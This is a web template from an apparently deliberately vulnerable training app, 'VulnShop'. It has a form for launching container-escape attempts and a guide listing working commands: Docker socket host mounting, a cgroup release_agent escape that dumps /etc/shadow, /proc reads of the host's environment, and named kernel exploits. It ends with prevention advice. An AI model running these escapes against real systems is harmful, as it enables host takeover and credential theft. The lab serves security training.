{% extends "base.html" %}

{% block title %}Container Escape - VulnShop{% endblock %}

{% block content %}
<div class="row">
    <div class="col-md-8 mx-auto">
        <div class="card">
            <div class="card-header bg-danger text-white">
                <h3 class="mb-0"><i class="fas fa-door-open"></i> Container Escape Laboratory</h3>
            </div>
            <div class="card-body">
                <div class="alert alert-danger">
                    <h5><i class="fas fa-skull-crossbones"></i> Container Breakout Zone</h5>
                    <p class="mb-0">Test various container escape techniques in this vulnerable environment!</p>
                </div>

                <form method="POST" action="{{ url_for('container_escape') }}">
                    <div class="mb-3">
                        <label class="form-label"><strong>Select Escape Technique:</strong></label>
                        
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="technique" value="docker_socket" id="docker_socket" checked>
                            <label class="form-check-label" for="docker_socket">
                                <strong>Docker Socket Escape</strong> - Access host via /var/run/docker.sock
                            </label>
                        </div>
                        
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="technique" value="privileged_escape" id="privileged_escape">
                            <label class="form-check-label" for="privileged_escape">
                                <strong>Privileged Container Check</strong> - Verify dangerous capabilities
                            </label>
                        </div>
                        
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="technique" value="proc_escape" id="proc_escape">
                            <label class="form-check-label" for="proc_escape">
                                <strong>Proc Filesystem Escape</strong> - Access host processes
                            </label>
                        </div>
                        
                        <div class="form-check">
                            <input class="form-check-input" type="radio" name="technique" value="cgroup_escape" id="cgroup_escape">
                            <label class="form-check-label" for="cgroup_escape">
                                <strong>Cgroup Escape (CVE-2019-5736 style)</strong> - Classic breakout
                            </label>
                        </div>
                    </div>
                    
                    <button type="submit" class="btn btn-danger w-100 btn-lg">
                        <i class="fas fa-rocket"></i> Execute Escape Attempt
                    </button>
                </form>

                {% if result %}
                <hr class="my-4">
                <h5><i class="fas fa-terminal"></i> Escape Attempt Result:</h5>
                <pre class="bg-dark text-light p-3" style="max-height: 400px; overflow-y: auto;">{{ result }}</pre>
                {% endif %}
            </div>
        </div>

        <!-- Educational Content -->
        <div class="card mt-4">
            <div class="card-header bg-dark text-white">
                <h5><i class="fas fa-graduation-cap"></i> Container Escape Guide</h5>
            </div>
            <div class="card-body">
                <h6>Method 1: Docker Socket Abuse</h6>
                <pre class="bg-light p-2 small">
# If /var/run/docker.sock is mounted:
docker run -v /:/host -it ubuntu chroot /host bash

# Now you're root on the host!
</pre>

                <h6 class="mt-3">Method 2: Privileged Container with CAP_SYS_ADMIN</h6>
                <pre class="bg-light p-2 small">
# Classic cgroup escape
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
</pre>

                <h6 class="mt-3">Method 3: Exposed /proc Filesystem</h6>
                <pre class="bg-light p-2 small">
# Access host init process
cat /proc/1/environ
cat /proc/1/cmdline

# Find host PID namespace
ls -la /proc/1/ns/
</pre>

                <h6 class="mt-3">Method 4: Kernel Exploits</h6>
                <pre class="bg-light p-2 small">
# DirtyCOW (CVE-2016-5195)
# Dirty Pipe (CVE-2022-0847)
# Use when other methods fail
</pre>

                <div class="alert alert-warning mt-3">
                    <h6>Prevention Methods:</h6>
                    <ul class="mb-0">
                        <li>Never mount Docker socket into containers</li>
                        <li>Avoid --privileged flag</li>
                        <li>Use security profiles (AppArmor/SELinux)</li>
                        <li>Drop unnecessary capabilities</li>
                        <li>Use read-only root filesystem</li>
                        <li>Enable user namespaces</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}
